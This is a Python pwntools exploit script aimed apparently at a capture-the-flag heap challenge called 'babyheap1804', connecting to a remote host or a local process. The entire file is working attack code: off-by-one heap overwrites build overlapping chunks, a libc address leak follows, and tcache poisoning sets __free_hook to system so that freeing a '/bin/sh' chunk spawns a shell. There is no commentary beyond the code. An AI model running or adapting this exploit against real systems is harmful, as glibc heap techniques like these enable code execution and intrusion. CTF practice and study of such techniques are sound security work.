from pwn import *

local=0
atta=0
uselibc=2  #0 0or no,1 for i386,2 for x64
haslibc=1
#pc='./babyheap1804'
pc='/tmp/pwn/babyheap1804_debug'
remote_addr="192.168.201.24"
remote_port=127

if uselibc==2:
    context.arch='amd64'
else:
    context.arch='i386'

if uselibc==2 and haslibc==0:
    libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
    if uselibc==1 and haslibc==0:
        libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
    else:
        if haslibc!=0:
            libc=ELF('./libc.so.6')

if local==1:
    if haslibc:
        p = process(pc,aslr=False,env={'LD_PRELOAD': './libc.so.6'})
    else:
        p=process(pc,aslr=False)
else:
    p=remote(remote_addr,remote_port)
    if haslibc!=0:
        libc=ELF('./libc.so.6')

if local:
    context.log_level=True
    if atta:
        gdb.attach(p)
        #gdb.attach(p,open('debug'))

def ru(a):
    return p.recvuntil(a)

def sn(a):
    p.send(a) 

def rl():
    return p.recvline()

def sl(a):
    p.sendline(a)

def rv(a):
    return p.recv(a)

def raddr(a,l=None):
    if l==None:
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def sa(a,b):
    p.sendafter(a,b)

def sla(a,b):
    p.sendlineafter(a,b)

def choice(index):
    sla('mand: ',str(index))

def alloc(size):
    choice(1)
    sla('Size: ',str(size))

def edit(index,size,content):
    choice(2)
    sla(": ",str(index))
    sla(": ",str(size))
    sa(": ",content)

def free(index):
    choice(3)
    sla(": ",str(index))

def view(index):
    choice(4)
    sla(": ",str(index))

def hack():
    alloc(0x58)
    free(0)
    alloc(0x38)
    free(0)
    for i in range(8):
        alloc(0x18)
    for i in range(8):
        edit(i,0x19,p64(0x31)*3+p8(0x91))

    i=7
    while(i>0):
        free(i)
        i-=1
    alloc(0x38)
    edit(1,0x39,'A'*0x38+p8(0x91))
    free(1)
    alloc(0x58)
    edit(1,0x59,'A'*0x58+p8(0x51))
    free(1)
    alloc(0x38)
    free(1)
    alloc(0x48)
    edit(1,0x39,'A'*0x38+p8(0x91))
    free(0)
    view(1)
    ru(': ')
    rv(0x40)
    libc_addr=raddr(6)-0x3ebca0
    lg("libc",libc_addr)
    alloc(0x28)
    alloc(0x28)
    alloc(0x28)
    alloc(0x28)
    alloc(0x28)
    alloc(0x28)
    alloc(0x28)
    edit(5,0x29,'B'*0x28+p8(0x41))
    free(6)
    free(7)
    alloc(0x38)
    libc.address=libc_addr
    payload='C'*0x28+p64(0x31)+p64(libc.symbols['__free_hook'])
    edit(6,len(payload),payload) 
    alloc(0x28)
    free(1)
    alloc(0x28)
    edit(1,8,p64(libc.symbols['system']))
    edit(2,8,'/bin/sh\x00')
    free(2)
    p.interactive()

hack()
